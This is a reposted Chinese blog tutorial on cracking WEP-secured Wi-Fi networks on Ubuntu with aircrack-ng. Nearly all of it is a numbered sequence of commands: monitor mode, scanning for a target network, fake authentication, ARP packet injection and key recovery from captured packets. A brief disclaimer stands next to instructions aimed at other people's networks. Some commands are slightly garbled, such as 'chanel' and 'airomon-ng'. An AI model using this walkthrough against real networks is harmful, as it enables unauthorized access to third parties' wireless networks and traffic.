---
title: ubuntu下无线网络的破解
author: 悟道
layout: post
permalink: /?p=515
categories:
  - 转载
---
<table>
  <tr cellpadding=0><td>
    热度:
  </td><td cellpadding=0><img src='http://210.75.224.29/wordpress/wp-content/plugins/statpresscn/images/sun.gif' width=10 height=10 border=0 /></td><td cellpadding=0><img src='http://210.75.224.29/wordpress/wp-content/plugins/statpresscn/images/sun.gif' width=10 height=10 border=0 /></td><td cellpadding=0><img src='http://210.75.224.29/wordpress/wp-content/plugins/statpresscn/images/sun.gif' width=10 height=10 border=0 /></td><td cellpadding=0><img src='http://210.75.224.29/wordpress/wp-content/plugins/statpresscn/images/sun.gif' width=10 height=10 border=0 /></td><td cellpadding=0><img src='http://210.75.224.29/wordpress/wp-content/plugins/statpresscn/images/sun_dark.gif' width=10 height=10 border=0 /></td></tr>
</table>

想必搞过破解的朋友们都会知道bt3  bt4等linux下的无线破解工具吧，在ubuntu系统下同样有着一款破解功能强大的工具，那就是aircrack-ng。放这篇文章出来只是做技术上的交流，奶牛可不希望谁用这个做坏事儿哦~~~嘿嘿，破解开始咯：

测试平台 Y450  T6600 2.1G  ubuntu 10.04 成功

1.下载安装aircrack-ng，奶牛直接从源中安装的。

sudo apt-get install aircrack-ng

2.启动无线，这里奶牛需要说明一下，很多朋友的无线可能在windows系统中是禁用或者是系统自带的电源管理系统中未开启无线的，这种情况下需 要先在win状态下开启之后才能在ubuntu中开启无线。开启完成后进入ubuntu ，开一个终端，ifconfig -a看看wlan是否开启，开启正常可进行下一步。

3.准备工作完成，开始破解。开启终端①，

<span>sudo airmon-ng start wlan0</span>

sudo airodump-ng mon0

这时会看到无线的地址出现在屏幕上，这里有显示它们的mac地址以及所在频道。ok，ctrl+c退出，在这里我们选择类型为wep的无线为破解对象。我们需要记录它所在的频道以及mac地址。

4.开启终端②

#原文中未使用双下划线， 修改之。

<span>sudo airodump-ng &#8211;chanel 频道 &#8211;bssid 目标主机mac -w wep mon0<br /> </span>

这里的wep为默认的存包文件的名字，可以更改。

<span> </span>5.开启终端③

<span>sudo aireplay-ng -1 0 -a 目标mac -h 本机MAC mon0</span>

（本机的mac可以开启一个新的终端用ifconfig -a来查询）

这时会有成功字样显示，如果没有显示可能就是目标不支持或者系统部稳定，需要更换目标了。显示成功后进行下步。

&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;

不知道这一步的作用是什么， 运行了几次都未成功， 不过不影响破解

6.继续输入<span>sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 目标MAC -h 本机MAC mon0 </span>

<span>此时终端</span>②中的数据会增长很快，当数据到达5000的时候就可以破解了。

7.开启终端<span> </span>④

sudo aircrack-ng wep*.cap

这时就开始破解了，如果你进行过多组，可能会有多组结果，你可以用数字123进行选择，如果不出意外你已经破解出来这组无线的密码了。

&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;

破解出来得到冒号分割的密码，去掉冒号， 重启电脑试验密码是否正确。

8.最后<span> sudo airmon-ng stop mon0结束监控过程</span>

<span>(</span><span> sudo airomon-ng check可以查看你开启了多少监控，如果运行多组的时候可以查看后选择关闭</span><span>)。 </span>

转载：http://www.nenew.net/ubuntu-aircrack-ng.html （略有修改）